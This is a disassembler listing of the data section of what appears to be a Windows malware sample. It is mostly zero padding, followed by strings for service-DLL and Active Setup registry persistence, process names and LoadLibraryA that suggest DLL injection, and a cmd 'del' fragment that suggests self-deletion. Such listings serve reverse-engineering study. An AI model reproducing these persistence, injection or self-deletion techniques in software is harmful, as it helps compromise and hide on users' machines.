.data:0040421F                 db    0
.data:00404220                 db    0
.data:00404221                 db    0
.data:00404222                 db    0
.data:00404223                 db    0
.data:00404224                 db    0
.data:00404225                 db    0
.data:00404226                 db    0
.data:00404227                 db    0
.data:00404228                 db    0
.data:00404229                 db    0
.data:0040422A                 db    0
.data:0040422B                 db    0
.data:0040422C                 db    0
.data:0040422D                 db    0
.data:0040422E                 db    0
.data:0040422F                 db    0
.data:00404230                 db    0
.data:00404231                 db    0
.data:00404232                 db    0
.data:00404233                 db    0
.data:00404234                 db    0
.data:00404235                 db    0
.data:00404236                 db    0
.data:00404237                 db    0
.data:00404238                 db    0
.data:00404239                 db    0
.data:0040423A                 db    0
.data:0040423B                 db    0
.data:0040423C                 db    0
.data:0040423D                 db    0
.data:0040423E                 db    0
.data:0040423F                 db    0
.data:00404240                 db    0
.data:00404241                 db    0
.data:00404242                 db    0
.data:00404243                 db    0
.data:00404244                 db    0
.data:00404245                 db    0
.data:00404246                 db    0
.data:00404247                 db    0
.data:00404248                 db    0
.data:00404249                 db    0
.data:0040424A                 db    0
.data:0040424B                 db    0
.data:0040424C                 db    0
.data:0040424D                 db    0
.data:0040424E                 db    0
.data:0040424F                 db    0
.data:00404250                 db    0
.data:00404251                 db    0
.data:00404252                 db    0
.data:00404253                 db    0
.data:00404254                 db    0
.data:00404255                 db    0
.data:00404256                 db    0
.data:00404257                 db    0
.data:00404258                 db    0
.data:00404259                 db    0
.data:0040425A                 db    0
.data:0040425B                 db    0
.data:0040425C                 db    0
.data:0040425D                 db    0
.data:0040425E                 db    0
.data:0040425F                 db    0
.data:00404260                 db    0
.data:00404261                 db    0
.data:00404262                 db    0
.data:00404263                 db    0
.data:00404264                 db    0
.data:00404265                 db    0
.data:00404266                 db    0
.data:00404267                 db    0
.data:00404268                 db    0
.data:00404269                 db    0
.data:0040426A                 db    0
.data:0040426B                 db    0
.data:0040426C                 db    0
.data:0040426D                 db    0
.data:0040426E                 db    0
.data:0040426F                 db    0
.data:00404270                 db    0
.data:00404271                 db    0
.data:00404272                 db    0
.data:00404273                 db    0
.data:00404274                 db    0
.data:00404275                 db    0
.data:00404276                 db    0
.data:00404277                 db    0
.data:00404278                 db    0
.data:00404279                 db    0
.data:0040427A                 db    0
.data:0040427B                 db    0
.data:0040427C                 db    0
.data:0040427D                 db    0
.data:0040427E                 db    0
.data:0040427F                 db    0
.data:00404280                 db    0
.data:00404281                 db    0
.data:00404282                 db    0
.data:00404283                 db    0
.data:00404284                 db    0
.data:00404285                 db    0
.data:00404286                 db    0
.data:00404287                 db    0
.data:00404288                 db    0
.data:00404289                 db    0
.data:0040428A                 db    0
.data:0040428B                 db    0
.data:0040428C                 db    0
.data:0040428D                 db    0
.data:0040428E                 db    0
.data:0040428F                 db    0
.data:00404290                 db    0
.data:00404291                 db    0
.data:00404292                 db    0
.data:00404293                 db    0
.data:00404294                 db    0
.data:00404295                 db    0
.data:00404296                 db    0
.data:00404297                 db    0
.data:00404298                 db    0
.data:00404299                 db    0
.data:0040429A                 db    0
.data:0040429B                 db    0
.data:0040429C                 db    0
.data:0040429D                 db    0
.data:0040429E                 db    0
.data:0040429F                 db    0
.data:004042A0                 db    0
.data:004042A1                 db    0
.data:004042A2                 db    0
.data:004042A3                 db    0
.data:004042A4                 db    0
.data:004042A5                 db    0
.data:004042A6                 db    0
.data:004042A7                 db    0
.data:004042A8                 db    0
.data:004042A9                 db    0
.data:004042AA                 db    0
.data:004042AB                 db    0
.data:004042AC                 db    0
.data:004042AD                 db    0
.data:004042AE                 db    0
.data:004042AF                 db    0
.data:004042B0                 db    0
.data:004042B1                 db    0
.data:004042B2                 db    0
.data:004042B3                 db    0
.data:004042B4                 db    0
.data:004042B5                 db    0
.data:004042B6                 db    0
.data:004042B7                 db    0
.data:004042B8                 db    0
.data:004042B9                 db    0
.data:004042BA                 db    0
.data:004042BB                 db    0
.data:004042BC                 db    0
.data:004042BD                 db    0
.data:004042BE                 db    0
.data:004042BF                 db    0
.data:004042C0                 db    0
.data:004042C1                 db    0
.data:004042C2                 db    0
.data:004042C3                 db    0
.data:004042C4                 db    0
.data:004042C5                 db    0
.data:004042C6                 db    0
.data:004042C7                 db    0
.data:004042C8 ; CHAR Caption[]
.data:004042C8 Caption         db '123',0              ; DATA XREF: WinMain(x,x,x,x)+11↑o
.data:004042C8                                         ; WinMain(x,x,x,x)+16↑o
.data:004042CC asc_4042CC      db '\',0                ; DATA XREF: sub_401000+88↑o
.data:004042CC                                         ; WinMain(x,x,x,x)+110↑o ...
.data:004042CE                 align 10h
.data:004042D0 aProgramFilesIn db 'Program Files\Internet Explorer',0
.data:004042D0                                         ; DATA XREF: sub_401000+47↑o
.data:004042F0 aCalcExe        db 'calc.exe',0         ; DATA XREF: sub_4010C0+56↑o
.data:004042F9                 align 4
.data:004042FC aNotepadExe     db 'notepad.exe',0      ; DATA XREF: sub_4010C0+40↑o
.data:00404308 aIexploreExe    db 'iexplore.exe',0     ; DATA XREF: sub_4010C0+2A↑o
.data:00404315                 align 4
.data:00404318 ; CHAR ModuleName[]
.data:00404318 ModuleName      db 'Kernel32',0         ; DATA XREF: sub_401150+BE↑o
.data:00404321                 align 4
.data:00404324 ; CHAR ProcName[]
.data:00404324 ProcName        db 'LoadLibraryA',0     ; DATA XREF: sub_401150:loc_401209↑o
.data:00404331                 align 4
.data:00404334 ; CHAR ValueName[]
.data:00404334 ValueName       db 'ServiceDLL',0       ; DATA XREF: sub_401260+BA↑o
.data:00404334                                         ; sub_401260+D8↑o ...
.data:0040433F                 align 10h
.data:00404340 ; CHAR SubKey[]
.data:00404340 SubKey          db 'SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters',0
.data:00404340                                         ; DATA XREF: sub_401260+A6↑o
.data:00404340                                         ; WinMain(x,x,x,x)+4E↑o
.data:0040437A                 align 4
.data:0040437C ; char aSystemrootSyst[]
.data:0040437C aSystemrootSyst db '%SystemRoot%\System32\',0
.data:0040437C                                         ; DATA XREF: sub_401260+1D↑o
.data:0040437C                                         ; WinMain(x,x,x,x):loc_401D46↑o
.data:00404393                 align 4
.data:00404394 ; CHAR aNul[]
.data:00404394 aNul            db ' > nul',0           ; DATA XREF: sub_401390+91↑o
.data:0040439B                 align 4
.data:0040439C ; CHAR String2[]
.data:0040439C String2         db ' /c  del ',0        ; DATA XREF: sub_401390+69↑o
.data:004043A6                 align 4
.data:004043A8 ; CHAR Name[]
.data:004043A8 Name            db 'COMSPEC',0          ; DATA XREF: sub_401390+4F↑o
.data:004043B0 ; char aDll[]
.data:004043B0 aDll            db 'DLL',0              ; DATA XREF: sub_401510+EC↑o
.data:004043B0                                         ; sub_401B90+65↑o ...
.data:004043B4 ; char Format[]
.data:004043B4 Format          db '{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}',0
.data:004043B4                                         ; DATA XREF: sub_401840+8E↑o
.data:004043E7                 align 4
.data:004043E8 ; char aWb[]
.data:004043E8 aWb             db 'wb',0               ; DATA XREF: sub_401900+1EB↑o
.data:004043EB                 align 4
.data:004043EC ; char Mode[]
.data:004043EC Mode            db 'rb',0               ; DATA XREF: sub_401900+163↑o
.data:004043EF                 align 10h
.data:004043F0 ; CHAR aStubpath[]
.data:004043F0 aStubpath       db 'stubpath',0         ; DATA XREF: sub_401900+145↑o
.data:004043F9                 align 4
.data:004043FC aSoftwareMicros db 'SOFTWARE\Microsoft\Active Setup\Installed Components\',0
.data:004043FC                                         ; DATA XREF: sub_401900+BD↑o
.data:00404432                 align 4
.data:00404434 ; char SubStr[]
.data:00404434 SubStr          db '.exe',0             ; DATA XREF: sub_401900+85↑o
.data:00404434                                         ; sub_401FD0+94↑o ...
.data:00404439                 align 4
.data:0040443C ; CHAR aDescription[]
.data:0040443C aDescription    db 'Description',0      ; DATA XREF: sub_401FD0+2E7↑o
.data:00404448 aSystemCurrentc_0 db 'SYSTEM\CurrentControlSet\Services\',0
.data:00404448                                         ; DATA XREF: sub_401FD0+26E↑o
.data:00404448                                         ; sub_402320+22↑o
.data:0040446B                 align 4
.data:0040446C ; char aExe_0[]
.data:0040446C aExe_0          db '.EXE',0             ; DATA XREF: sub_401FD0+AF↑o
.data:00404471                 align 10h
.data:00404480 dword_404480    dd 1                    ; DATA XREF: start+6F↑r
.data:00404484                 align 8
.data:00404488 ; SERVICE_STATUS_HANDLE hServiceStatus
.data:00404488 hServiceStatus  dd 0                    ; DATA XREF: sub_401510+3D↑w
.data:00404488                                         ; sub_401510+8D↑r ...
.data:0040448C                 align 10h
.data:00404490 ; struct _SERVICE_STATUS ServiceStatus
.data:00404490 ServiceStatus   _SERVICE_STATUS <0>     ; DATA XREF: sub_401510+37↑o
.data:00404490                                         ; sub_401510+42↑w ...
.data:004044AC dword_4044AC    dd 0                    ; DATA XREF: WinMain(x,x,x,x)+2AC↑r
.data:004044AC                                         ; sub_401FD0+19C↑w
.data:004044B0 ; char Buffer[64]
.data:004044B0 Buffer          db 40h dup(0)           ; DATA XREF: sub_401840+95↑o
.data:004044B0                                         ; sub_401840+A9↑o
.data:004044F0 unk_4044F0      db    0                 ; DATA XREF: sub_401260+4A↑o
.data:004044F1                 db    0
.data:004044F2                 db    0
.data:004044F3                 db    0
.data:004044F4 ; CHAR Text[16]
.data:004044F4 Text            db 10h dup(0)           ; DATA XREF: WinMain(x,x,x,x)+2CC↑o
.data:004044F4                                         ; WinMain(x,x,x,x)+2D1↑o ...
.data:00404504 dword_404504    dd 0                    ; DATA XREF: start+A3↑r
.data:00404508 dword_404508    dd 0                    ; DATA XREF: start+97↑r
.data:0040450C dword_40450C    dd 0                    ; DATA XREF: start+56↑r
.data:00404510 dword_404510    dd 0                    ; DATA XREF: start+48↑r
.data:00404514 dword_404514    dd 0                    ; DATA XREF: start+65↑w
.data:00404518 dword_404518    dd 0FFFFFFFFh           ; DATA XREF: __onexit:loc_40264B↑o
.data:00404518                                         ; start+34↑w
.data:0040451C dword_40451C    dd 0FFFFFFFFh           ; DATA XREF: __onexit↑r
.data:0040451C                                         ; __onexit+1A↑o ...
.data:00404520                 align 1000h
.data:00404520 _data           ends
.data:00404520
.data:00404520
.data:00404520                 end start
